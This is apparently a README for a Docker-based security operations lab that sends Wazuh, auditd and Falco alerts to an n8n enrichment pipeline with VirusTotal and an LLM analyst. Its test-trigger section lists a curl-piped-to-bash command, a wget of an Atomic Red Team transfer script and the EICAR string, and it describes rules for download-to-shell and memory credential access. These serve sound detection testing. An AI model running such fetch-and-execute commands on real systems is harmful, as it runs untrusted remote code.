# 🛡️ Agentic SOC — Linux EDR + n8n "Always-Enrich" Pipeline

A fully containerized Security Operations Center lab. A **Linux endpoint** (Wazuh agent
+ auditd + Falco) generates telemetry, the **Wazuh manager** detects and forwards
alerts (level ≥ 10) to **n8n**, which runs an automated Tier-3 enrichment pipeline
(IOCs → timeline → VirusTotal → LLM verdict/MITRE/YARA → case written to the Wazuh
index). Everything is Docker, talks by service name on one network, and is portable
across PCs — no hardcoded IPs.

## Architecture

```
linux-endpoint (Wazuh agent + auditd + Falco)
      │ 1514/1515
      ▼
wazuh.manager ──custom-n8n (level≥10)──▶ n8n:5678/webhook/soc-alert
      │                                        │
      │ 9200                                   ▼
      ▼                            Extract IOCs → Timeline → VirusTotal
wazuh.indexer                              → Merge → Tier-3 LLM → Score
(Wazuh alerts + agentic-soc-cases)        → Switch → Write case to index
```

## Features (port of the original Windows/Defender/Sysmon lab)

| Feature | Linux implementation |
|---|---|
| FIM | Wazuh `syscheck` on `/home/victim/{Downloads,Desktop}` + `/tmp` (sha256, realtime) |
| Behavioral EDR | auditd command monitoring + Falco runtime rules |
| Credential-access detection | auditd rule on `gcore`/`/proc/*/mem` (LSASS analog) |
| Download-to-shell | rule 100015 (curl\|sh / wget\|bash) |
| n8n enrichment | Webhook → Extract IOCs → Timeline → VirusTotal → Merge → Tier-3 LLM → Score → Switch → Write-back |
| LLM analyst | OpenRouter (verdict / malware_family / MITRE / YARA) |
| Active response | `soc-quarantine.sh` moves offending file to `/quarantine` |
| Dashboard | Wazuh Dashboards at https://localhost (index pattern `agentic-soc-cases*`) |

## Quick start

```bash
cp .env.example .env          # set N8N_ENCRYPTION_KEY, VT_API_KEY, OPENROUTER_API_KEY
chmod +x bootstrap.sh
./bootstrap.sh                # generates certs, builds + starts the stack
```

Then open:
- Wazuh Dashboard: https://localhost  (admin / `INDEXER_PASSWORD`)
- n8n: http://localhost:5678
- OpenSearch API: https://localhost:9200

## Test triggers (run inside the endpoint container)

```bash
docker exec -it agentic-soc-linux-endpoint-1 bash

# EICAR (→ Benign verdict, FIM rule 100030)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/victim/Downloads/eicar.txt

# Download piped to shell (→ Malicious, rule 100015)
curl -s https://example.com/x.sh | bash

# Suspicious command (→ Malicious/Suspicious, rule 100013)
wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.sh -O /tmp/t.sh
```

Watch cases appear in `agentic-soc-cases` (OpenSearch) and the Wazuh dashboard.

## Project layout

```
docker-compose.yml          # full stack: wazuh (manager/indexer/dashboard) + n8n + linux-endpoint + falco
generate-certs.yml          # one-shot cert generator
config/
  manager/ossec.conf        # persistent manager config (integration + active response)
  manager/local_rules.xml   # EDR detection rules (100012–100030)
  manager/custom-n8n        # integration script → n8n webhook
  manager/soc-quarantine.sh # active-response script
  wazuh_indexer/  wazuh_dashboard/  certs.yml
  falco/                    # Falco behavioral rules
endpoint/                   # Linux endpoint image (Wazuh agent + auditd)
n8n/workflows/always-enrich.json   # the n8n pipeline
bootstrap.sh
```

## Notes

- Manager config (ossec.conf, rules, integration) is bind-mounted, so it **persists** across
  `docker compose down/up` — fixing the "config not persistent" gotcha from the original lab.
- Secrets are injected from `.env`; the endpoint enrolls to `wazuh.manager` by service name.
- To run the n8n workflow, import `n8n/workflows/always-enrich.json` (or mount it; the
  container auto-loads it into `/home/node/.n8n/workflows_import`).
